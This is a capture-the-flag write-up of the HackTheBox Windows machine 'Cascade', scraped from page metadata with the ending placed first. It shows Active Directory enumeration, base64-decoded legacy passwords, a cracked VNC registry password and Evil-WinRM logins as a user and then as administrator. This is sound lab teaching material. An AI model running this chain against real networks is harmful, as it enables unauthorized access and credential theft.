DEL:f0cc344d-31e0-4866-bceb-a842791ca059 nTSecurityDescriptor : System.DirectoryServices.ActiveDirectorySecurity ObjectCategory : ObjectClass : user ObjectGUID : f0cc344d-31e0-4866-bceb-a842791ca059 objectSid : S-1-5-21-3332504370-1206983947-1165150453-1136 primaryGroupID : 513 ProtectedFromAccidentalDeletion : False pwdLastSet : 132245689883479503 sAMAccountName : TempAdmin sDRightsEffective : 0 userAccountControl : 66048 userPrincipalName : TempAdmin@cascade.local uSNChanged : 237705 uSNCreated : 237695 whenChanged : 1/27/2020 3:24:34 AM whenCreated : 1/27/2020 3:23:08 AM Found the cascadeLegacyPwd of Tempadmin cascadeLegacyPwd : YmFDVDNyMWFOMDBkbGVz Time to decode.. echo YmFDVDNyMWFOMDBkbGVz|base64 -d baCT3r1aN00dles — Logging as ADMIN evil-winrm -i cascade.htb -u administrator -p baCT3r1aN00dles Evil-WinRM shell v2.0 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\Administrator\Documents&gt; Getting Root.txt *Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd .. *Evil-WinRM* PS C:\Users\Administrator&gt; cd Desktop *Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root.txt 930****************************b35b *Evil-WinRM* PS C:\Users\Administrator\Desktop If you like my work, please do consider giving me +rep on HACKTHEBOX. My HackTheBox profile: https://www.hackthebox.eu/home/users/profile/291968">
<link rel="canonical" href="http://192.168.0.111:6001/hackthebox/2020/06/26/Cascade.html">
<meta property="og:url" content="http://192.168.0.111:6001/hackthebox/2020/06/26/Cascade.html">
<meta property="og:site_name" content="DC0deZer0">
<meta property="og:image" content="http://192.168.0.111:6001/assets/img/sample/cascade/cascade.png">
<meta property="og:type" content="article">
<meta property="article:published_time" content="2020-06-26T22:09:00+05:30">
<meta name="twitter:card" content="summary_large_image">
<meta property="twitter:image" content="http://192.168.0.111:6001/assets/img/sample/cascade/cascade.png">
<meta property="twitter:title" content="HackTheBox Cascade">
<script type="application/ld+json">
{"mainEntityOfPage":{"@type":"WebPage","@id":"http://192.168.0.111:6001/hackthebox/2020/06/26/Cascade.html"},"description":"Cascade is a windows machine on Hackthebox, made by VBSCRUB which I personally a big fan of him. This box is one hell of an awsome machine made by him. Info Cascade   OS: Windows Difficulty: Medium Points: 30 Release: 28 Mar 2020 IP: 10.10.10.182 Let’s start hacking into CASCADE As always hacking starts with NMAP scan. nmap -sV -A -T4 -Pn -sC -vvv cascade.htb Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-23 02:52 EDT NSE: Loaded 151 scripts for scanning. NSE: Script Pre-scanning. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 02:52 Completed NSE at 02:52, 0.00s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 02:52 Completed NSE at 02:52, 0.00s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 02:52 Completed NSE at 02:52, 0.00s elapsed Initiating SYN Stealth Scan at 02:52 Scanning cascade.htb (10.10.10.182) [1000 ports] Discovered open port 445/tcp on 10.10.10.182 Discovered open port 53/tcp on 10.10.10.182 Discovered open port 135/tcp on 10.10.10.182 Discovered open port 139/tcp on 10.10.10.182 Discovered open port 49157/tcp on 10.10.10.182 Discovered open port 49154/tcp on 10.10.10.182 Discovered open port 3268/tcp on 10.10.10.182 Discovered open port 88/tcp on 10.10.10.182 Discovered open port 49165/tcp on 10.10.10.182 Discovered open port 636/tcp on 10.10.10.182 Discovered open port 49155/tcp on 10.10.10.182 Discovered open port 389/tcp on 10.10.10.182 Discovered open port 49158/tcp on 10.10.10.182 Discovered open port 3269/tcp on 10.10.10.182 Completed SYN Stealth Scan at 02:52, 9.90s elapsed (1000 total ports) Initiating Service scan at 02:52 Scanning 14 services on cascade.htb (10.10.10.182) Completed Service scan at 02:53, 56.75s elapsed (14 services on 1 host) Initiating OS detection (try #1) against cascade.htb (10.10.10.182) Retrying OS detection (try #2) against cascade.htb (10.10.10.182) Initiating Traceroute at 02:53 Completed Traceroute at 02:53, 0.22s elapsed Initiating Parallel DNS resolution of 2 hosts. at 02:53 Completed Parallel DNS resolution of 2 hosts. at 02:53, 13.11s elapsed DNS resolution of 1 IPs took 13.11s. Mode: Async [#: 1, OK: 0, NX: 0, DR: 1, SF: 0, TR: 3, CN: 0] NSE: Script scanning 10.10.10.182. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 02:53 NSE Timing: About 99.95% done; ETC: 02:54 (0:00:00 remaining) Completed NSE at 02:54, 40.20s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 02:54 NSE Timing: About 97.32% done; ETC: 02:54 (0:00:01 remaining) NSE Timing: About 98.21% done; ETC: 02:55 (0:00:01 remaining) NSE Timing: About 99.11% done; ETC: 02:55 (0:00:01 remaining) Completed NSE at 02:56, 120.90s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 02:56 Completed NSE at 02:56, 0.00s elapsed Nmap scan report for cascade.htb (10.10.10.182) Host is up, received user-set (0.18s latency). Scanned at 2020-07-23 02:52:18 EDT for 246s Not shown: 986 filtered ports Reason: 986 no-responses PORT STATE SERVICE REASON VERSION 53/tcp open domain syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1) | dns-nsid: |_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39) 88/tcp open tcpwrapped syn-ack ttl 127 135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn 389/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds? syn-ack ttl 127 636/tcp open tcpwrapped syn-ack ttl 127 3268/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped syn-ack ttl 127 49154/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49155/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49157/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 49158/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49165/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose|phone|specialized Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (91%) OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012 OS fingerprint not ideal because: Missing a closed TCP port so results incomplete Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (91%), Microsoft Windows Phone 7.5 or 8.0 (91%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%) No exact OS matches for host (test conditions non-ideal). TCP/IP fingerprint: SCAN(V=7.80%E=4%D=7/23%OT=53%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=5F193499%P=x86_64-pc-linux-gnu) SEQ(SP=106%GCD=1%ISR=10C%TI=I%II=I%TS=7) OPS(O1=M54DNW8ST11%O2=M54DNW8ST11%O3=M54DNW8NNT11%O4=M54DNW8ST11%O5=M54DNW8ST11%O6=M54DST11) WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000) ECN(R=Y%DF=Y%TG=80%W=2000%O=M54DNW8NNS%CC=N%Q=) T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=) T2(R=N) T3(R=N) T4(R=N) U1(R=N) IE(R=Y%DFI=N%TG=80%CD=Z) Uptime guess: 0.479 days (since Wed Jul 22 15:26:52 2020) Network Distance: 2 hops TCP Sequence Prediction: Difficulty=253 (Good luck!) IP ID Sequence Generation: Incremental Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows Host script results: |_clock-skew: 3m22s | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 62331/tcp): CLEAN (Timeout) | Check 2 (port 51409/tcp): CLEAN (Timeout) | Check 3 (port 10882/udp): CLEAN (Timeout) | Check 4 (port 53799/udp): CLEAN (Timeout) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2020-07-23T06:57:09 |_ start_date: 2020-07-22T19:30:40 TRACEROUTE (using port 445/tcp) HOP RTT ADDRESS 1 184.36 ms 10.10.14.1 2 184.52 ms cascade.htb (10.10.10.182) NSE: Script Post-scanning. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 02:56 Completed NSE at 02:56, 0.00s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 02:56 Completed NSE at 02:56, 0.00s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 02:56 Completed NSE at 02:56, 0.00s elapsed Read data files from: /usr/bin/../share/nmap OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 248.12 seconds Raw packets sent: 2074 (94.964KB) | Rcvd: 144 (20.275KB) Enum4linux enum4linux -a cascade.htb Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Jul 23 02:47:55 2020 ========================== | Target Information | ========================== Target ........... cascade.htb RID Range ........ 500-550,1000-1050 Username ......... &#39;&#39; Password ......... &#39;&#39; Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none =================================================== | Enumerating Workgroup/Domain on cascade.htb | =================================================== [E] Can&#39;t find workgroup/domain =========================================== | Nbtstat Information for cascade.htb | =========================================== Looking up status of 10.10.10.182 No reply from 10.10.10.182 ==================================== | Session Check on cascade.htb | ==================================== Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437. [+] Server cascade.htb allows sessions using username &#39;&#39;, password &#39;&#39; Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451. [+] Got domain/workgroup name: ========================================== | Getting domain SID for cascade.htb | ========================================== Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359. Domain Name: CASCADE Domain Sid: S-1-5-21-3332504370-1206983947-1165150453 [+] Host is part of a domain (not a workgroup) ===================================== | OS information on cascade.htb | ===================================== Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458. Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464. [+] Got OS info for cascade.htb from smbclient: Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467. [+] Got OS info for cascade.htb from srvinfo: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED ============================ | Users on cascade.htb | ============================ Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866. index: 0xee0 RID: 0x464 acb: 0x00000214 Account: a.turnbull Name: Adrian Turnbull Desc: (null) index: 0xebc RID: 0x452 acb: 0x00000210 Account: arksvc Name: ArkSvc Desc: (null) index: 0xee4 RID: 0x468 acb: 0x00000211 Account: b.hanson Name: Ben Hanson Desc: (null) index: 0xee7 RID: 0x46a acb: 0x00000210 Account: BackupSvc Name: BackupSvc Desc: (null) index: 0xdeb RID: 0x1f5 acb: 0x00000215 Account: CascGuest Name: (null) Desc: Built-in account for guest access to the computer/domain index: 0xee5 RID: 0x469 acb: 0x00000210 Account: d.burman Name: David Burman Desc: (null) index: 0xee3 RID: 0x467 acb: 0x00000211 Account: e.crowe Name: Edward Crowe Desc: (null) index: 0xeec RID: 0x46f acb: 0x00000211 Account: i.croft Name: Ian Croft Desc: (null) index: 0xeeb RID: 0x46e acb: 0x00000210 Account: j.allen Name: Joseph Allen Desc: (null) index: 0xede RID: 0x462 acb: 0x00000210 Account: j.goodhand Name: John Goodhand Desc: (null) index: 0xed7 RID: 0x45c acb: 0x00000210 Account: j.wakefield Name: James Wakefield Desc: (null) index: 0xeca RID: 0x455 acb: 0x00000210 Account: r.thompson Name: Ryan Thompson Desc: (null) index: 0xedd RID: 0x461 acb: 0x00000210 Account: s.hickson Name: Stephanie Hickson Desc: (null) index: 0xebd RID: 0x453 acb: 0x00000210 Account: s.smith Name: Steve Smith Desc: (null) index: 0xed2 RID: 0x457 acb: 0x00000210 Account: util Name: Util Desc: (null) Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881. user:[CascGuest] rid:[0x1f5] user:[arksvc] rid:[0x452] user:[s.smith] rid:[0x453] user:[r.thompson] rid:[0x455] user:[util] rid:[0x457] user:[j.wakefield] rid:[0x45c] user:[s.hickson] rid:[0x461] user:[j.goodhand] rid:[0x462] user:[a.turnbull] rid:[0x464] user:[e.crowe] rid:[0x467] user:[b.hanson] rid:[0x468] user:[d.burman] rid:[0x469] user:[BackupSvc] rid:[0x46a] user:[j.allen] rid:[0x46e] user:[i.croft] rid:[0x46f] ======================================== | Share Enumeration on cascade.htb | ======================================== Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640. Sharename Type Comment --------- ---- ------- SMB1 disabled -- no workgroup available [+] Attempting to map shares on cascade.htb =================================================== | Password Policy Information for cascade.htb | =================================================== [+] Attaching to cascade.htb using a NULL share [+] Trying protocol 445/SMB... [+] Found domain(s): [+] CASCADE [+] Builtin [+] Password Info for Domain: CASCADE [+] Minimum password length: 5 [+] Password history length: None [+] Maximum password age: Not Set [+] Password Complexity Flags: 000000 [+] Domain Refuse Password Change: 0 [+] Domain Password Store Cleartext: 0 [+] Domain Password Lockout Admins: 0 [+] Domain Password No Clear Change: 0 [+] Domain Password No Anon Change: 0 [+] Domain Password Complex: 0 [+] Minimum password age: None [+] Reset Account Lockout Counter: 30 minutes [+] Locked Account Duration: 30 minutes [+] Account Lockout Threshold: None [+] Forced Log off Time: Not Set Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501. [+] Retieved partial password policy with rpcclient: Password Complexity: Disabled Minimum Password Length: 5 ============================= | Groups on cascade.htb | ============================= Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542. [+] Getting builtin groups: group:[Pre-Windows 2000 Compatible Access] rid:[0x22a] group:[Incoming Forest Trust Builders] rid:[0x22d] group:[Windows Authorization Access Group] rid:[0x230] group:[Terminal Server License Servers] rid:[0x231] group:[Users] rid:[0x221] group:[Guests] rid:[0x222] group:[Remote Desktop Users] rid:[0x22b] group:[Network Configuration Operators] rid:[0x22c] group:[Performance Monitor Users] rid:[0x22e] group:[Performance Log Users] rid:[0x22f] group:[Distributed COM Users] rid:[0x232] group:[IIS_IUSRS] rid:[0x238] group:[Cryptographic Operators] rid:[0x239] group:[Event Log Readers] rid:[0x23d] group:[Certificate Service DCOM Access] rid:[0x23e] [+] Getting builtin group memberships: Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Group &#39;Pre-Windows 2000 Compatible Access&#39; (RID: 554) has member: NT AUTHORITY\\Authenticated Users Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Group &#39;Guests&#39; (RID: 546) has member: CASCADE\\CascGuest Group &#39;Guests&#39; (RID: 546) has member: CASCADE\\Domain Guests Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Group &#39;Users&#39; (RID: 545) has member: NT AUTHORITY\\INTERACTIVE Group &#39;Users&#39; (RID: 545) has member: NT AUTHORITY\\Authenticated Users Group &#39;Users&#39; (RID: 545) has member: CASCADE\\Domain Users Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Group &#39;Windows Authorization Access Group&#39; (RID: 560) has member: NT AUTHORITY\\ENTERPRISE DOMAIN CONTROLLERS Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542. [+] Getting local groups: group:[Cert Publishers] rid:[0x205] group:[RAS and IAS Servers] rid:[0x229] group:[Allowed RODC Password Replication Group] rid:[0x23b] group:[Denied RODC Password Replication Group] rid:[0x23c] group:[DnsAdmins] rid:[0x44e] group:[IT] rid:[0x459] group:[Production] rid:[0x45a] group:[HR] rid:[0x45b] group:[AD Recycle Bin] rid:[0x45f] group:[Backup] rid:[0x460] group:[Temps] rid:[0x463] group:[WinRMRemoteWMIUsers__] rid:[0x465] group:[Remote Management Users] rid:[0x466] group:[Factory] rid:[0x46c] group:[Finance] rid:[0x46d] group:[Audit Share] rid:[0x471] group:[Data Share] rid:[0x472] [+] Getting local group memberships: Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Group &#39;HR&#39; (RID: 1115) has member: CASCADE\\s.hickson Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Group &#39;Denied RODC Password Replication Group&#39; (RID: 572) has member: CASCADE\\krbtgt Group &#39;Denied RODC Password Replication Group&#39; (RID: 572) has member: CASCADE\\Domain Controllers Group &#39;Denied RODC Password Replication Group&#39; (RID: 572) has member: CASCADE\\Schema Admins Group &#39;Denied RODC Password Replication Group&#39; (RID: 572) has member: CASCADE\\Enterprise Admins Group &#39;Denied RODC Password Replication Group&#39; (RID: 572) has member: CASCADE\\Cert Publishers Group &#39;Denied RODC Password Replication Group&#39; (RID: 572) has member: CASCADE\\Domain Admins Group &#39;Denied RODC Password Replication Group&#39; (RID: 572) has member: CASCADE\\Group Policy Creator Owners Group &#39;Denied RODC Password Replication Group&#39; (RID: 572) has member: CASCADE\\Read-only Domain Controllers Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Group &#39;IT&#39; (RID: 1113) has member: CASCADE\\arksvc Group &#39;IT&#39; (RID: 1113) has member: CASCADE\\s.smith Group &#39;IT&#39; (RID: 1113) has member: CASCADE\\r.thompson Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Group &#39;Data Share&#39; (RID: 1138) has member: CASCADE\\Domain Users Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Group &#39;Audit Share&#39; (RID: 1137) has member: CASCADE\\s.smith Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Group &#39;Remote Management Users&#39; (RID: 1126) has member: CASCADE\\arksvc Group &#39;Remote Management Users&#39; (RID: 1126) has member: CASCADE\\s.smith Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Group &#39;AD Recycle Bin&#39; (RID: 1119) has member: CASCADE\\arksvc Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 593. [+] Getting domain groups: group:[Enterprise Read-only Domain Controllers] rid:[0x1f2] group:[Domain Users] rid:[0x201] group:[Domain Guests] rid:[0x202] group:[Domain Computers] rid:[0x203] group:[Group Policy Creator Owners] rid:[0x208] group:[DnsUpdateProxy] rid:[0x44f] [+] Getting domain group memberships: Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614. Group &#39;Domain Users&#39; (RID: 513) has member: CASCADE\\administrator Group &#39;Domain Users&#39; (RID: 513) has member: CASCADE\\krbtgt Group &#39;Domain Users&#39; (RID: 513) has member: CASCADE\\arksvc Group &#39;Domain Users&#39; (RID: 513) has member: CASCADE\\s.smith Group &#39;Domain Users&#39; (RID: 513) has member: CASCADE\\r.thompson Group &#39;Domain Users&#39; (RID: 513) has member: CASCADE\\util Group &#39;Domain Users&#39; (RID: 513) has member: CASCADE\\j.wakefield Group &#39;Domain Users&#39; (RID: 513) has member: CASCADE\\s.hickson Group &#39;Domain Users&#39; (RID: 513) has member: CASCADE\\j.goodhand Group &#39;Domain Users&#39; (RID: 513) has member: CASCADE\\a.turnbull Group &#39;Domain Users&#39; (RID: 513) has member: CASCADE\\e.crowe Group &#39;Domain Users&#39; (RID: 513) has member: CASCADE\\b.hanson Group &#39;Domain Users&#39; (RID: 513) has member: CASCADE\\d.burman Group &#39;Domain Users&#39; (RID: 513) has member: CASCADE\\BackupSvc Group &#39;Domain Users&#39; (RID: 513) has member: CASCADE\\j.allen Group &#39;Domain Users&#39; (RID: 513) has member: CASCADE\\i.croft Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614. Group &#39;Domain Guests&#39; (RID: 514) has member: CASCADE\\CascGuest Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614. Group &#39;Group Policy Creator Owners&#39; (RID: 520) has member: CASCADE\\administrator Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614. Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614. Using Ldap Search— Intresting findings from ldapsearch dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local objectClass: top objectClass: person objectClass: organizationalPerson objectClass: user cn: Ryan Thompson sn: Thompson givenName: Ryan distinguishedName: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local instanceType: 4 whenCreated: 20200109193126.0Z whenChanged: 20200323112031.0Z displayName: Ryan Thompson uSNCreated: 24610 memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local uSNChanged: 295010 name: Ryan Thompson objectGUID:: LfpD6qngUkupEy9bFXBBjA== userAccountControl: 66048 badPwdCount: 8 codePage: 0 countryCode: 0 badPasswordTime: 132299219591809760 lastLogoff: 0 lastLogon: 132299203623153712 pwdLastSet: 132230718862636251 primaryGroupID: 513 objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA== accountExpires: 9223372036854775807 logonCount: 2 sAMAccountName: r.thompson sAMAccountType: 805306368 userPrincipalName: r.thompson@cascade.local objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local dSCorePropagationData: 20200126183918.0Z dSCorePropagationData: 20200119174753.0Z dSCorePropagationData: 20200119174719.0Z dSCorePropagationData: 20200119174508.0Z dSCorePropagationData: 16010101000000.0Z lastLogonTimestamp: 132294360317419816 msDS-SupportedEncryptionTypes: 0 This seems more intresting.. cascadeLegacyPwd: clk0bjVldmE= Decoding with the base64 echo &quot;clk0bjVldmE=&quot; | base64 -d rY4n5eva Using smbclient for further more enumeration! smbclient -L cascade.htb -U r.thompson Enter WORKGROUP\\r.thompson&#39;s password: Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin Audit$ Disk C$ Disk Default share Data Disk IPC$ IPC Remote IPC NETLOGON Disk Logon server share print$ Disk Printer Drivers SYSVOL Disk Logon server share SMB1 disabled -- no workgroup available Some more intresting findings! smbclient //cascade.htb/Data -U r.thompson Enter WORKGROUP\\r.thompson&#39;s password: Try &quot;help&quot; to get a list of possible commands. smb: \\&gt; ls . D 0 Sun Jan 26 22:27:34 2020 .. D 0 Sun Jan 26 22:27:34 2020 Contractors D 0 Sun Jan 12 20:45:11 2020 Finance D 0 Sun Jan 12 20:45:06 2020 IT D 0 Tue Jan 28 13:04:51 2020 Production D 0 Sun Jan 12 20:45:18 2020 Temps D 0 Sun Jan 12 20:45:15 2020 13106687 blocks of size 4096. 7806882 blocks available smb: \\&gt; cd It smb: \\It\\&gt; ls . D 0 Tue Jan 28 13:04:51 2020 .. D 0 Tue Jan 28 13:04:51 2020 Email Archives D 0 Tue Jan 28 13:00:30 2020 LogonAudit D 0 Tue Jan 28 13:04:40 2020 Logs D 0 Tue Jan 28 19:53:04 2020 Temp D 0 Tue Jan 28 17:06:59 2020 13106687 blocks of size 4096. 7806882 blocks available After moving into the dir Email Archives………. smb: \\IT\\Email Archives\\&gt; ls . D 0 Tue Jan 28 13:04:51 2020 .. D 0 Tue Jan 28 13:04:51 2020 Meeting_Notes_June_2018.html A 2522 Tue Jan 28 13:04:51 2020 13106687 blocks of size 4096. 7793283 blocks available smb: \\IT\\Email Archives\\&gt; get Meeting_Notes_June_2018.html getting file \\IT\\Email Archives\\Meeting_Notes_June_2018.html of size 2522 as Meeting_Notes_June_2018.html (3.3 KiloBytes/sec) (average 3.3 KiloBytes/sec) cat Meeting_Notes_June_2018.html &lt;p&gt;-- New production network will be going live on Wednesday so keep an eye out for any issues. &lt;/p&gt; &lt;p&gt;-- We will be using a temporary account to perform all tasks related to the network migration and this account will be deleted at the end of 2018 once the migration is complete. This will allow us to identify actions related to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password). &lt;/p&gt; &lt;p&gt;-- The winner of the �Best GPO� competition will be announced on Friday so get your submissions in soon.&lt;/p&gt; So from here I moved into the Temp folder and found a user S.Smith. smb: \\IT\\Temp\\s.smith\\&gt; ls . D 0 Wed Jan 29 05:00:01 2020 .. D 0 Wed Jan 29 05:00:01 2020 VNC Install.reg A 2680 Wed Jan 29 04:27:44 2020 13106687 blocks of size 4096. 7793278 blocks available Here there is a registery found VNC Install.reg. let’s see what’s inside that. cat VNC Install.reg ��Windows Registry Editor Version 5.00 [HKEY_LOCAL_MACHINE\\SOFTWARE\\TightVNC] [HKEY_LOCAL_MACHINE\\SOFTWARE\\TightVNC\\Server] &quot;ExtraPorts&quot;=&quot;&quot; &quot;QueryTimeout&quot;=dword:0000001e &quot;QueryAcceptOnTimeout&quot;=dword:00000000 &quot;LocalInputPriorityTimeout&quot;=dword:00000003 &quot;LocalInputPriority&quot;=dword:00000000 &quot;BlockRemoteInput&quot;=dword:00000000 &quot;BlockLocalInput&quot;=dword:00000000 &quot;IpAccessControl&quot;=&quot;&quot; &quot;RfbPort&quot;=dword:0000170c &quot;HttpPort&quot;=dword:000016a8 &quot;DisconnectAction&quot;=dword:00000000 &quot;AcceptRfbConnections&quot;=dword:00000001 &quot;UseVncAuthentication&quot;=dword:00000001 &quot;UseControlAuthentication&quot;=dword:00000000 &quot;RepeatControlAuthentication&quot;=dword:00000000 &quot;LoopbackOnly&quot;=dword:00000000 &quot;AcceptHttpConnections&quot;=dword:00000001 &quot;LogLevel&quot;=dword:00000000 &quot;EnableFileTransfers&quot;=dword:00000001 &quot;RemoveWallpaper&quot;=dword:00000001 &quot;UseD3D&quot;=dword:00000001 &quot;UseMirrorDriver&quot;=dword:00000001 &quot;EnableUrlParams&quot;=dword:00000001 &quot;Password&quot;=hex:6b,cf,2a,4b,6e,5a,ca,0f &quot;AlwaysShared&quot;=dword:00000000 &quot;NeverShared&quot;=dword:00000000 &quot;DisconnectClients&quot;=dword:00000001 &quot;PollingInterval&quot;=dword:000003e8 &quot;AllowLoopback&quot;=dword:00000000 &quot;VideoRecognitionInterval&quot;=dword:00000bb8 &quot;GrabTransparentWindows&quot;=dword:00000001 &quot;SaveLogToAllUsersPath&quot;=dword:00000000 &quot;RunControlInterface&quot;=dword:00000001 &quot;IdleTimeout&quot;=dword:00000000 &quot;VideoClasses&quot;=&quot;&quot; &quot;VideoRects&quot;=&quot;&quot; &quot;Password&quot;=hex:6b,cf,2a,4b,6e,5a,ca,0f after cracking the hex we get the password as sT333ve2 Login as S.Smith evil-winrm -i cascade.htb -u s.smith -p sT333ve2 Evil-WinRM shell v2.0 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\s.smith\\Documents&gt; Getting User.txt *Evil-WinRM* PS C:\\Users\\s.smith\\Documents&gt; cd .. *Evil-WinRM* PS C:\\Users\\s.smith&gt; cd Desktop *Evil-WinRM* PS C:\\Users\\s.smith\\Desktop&gt; type user.txt 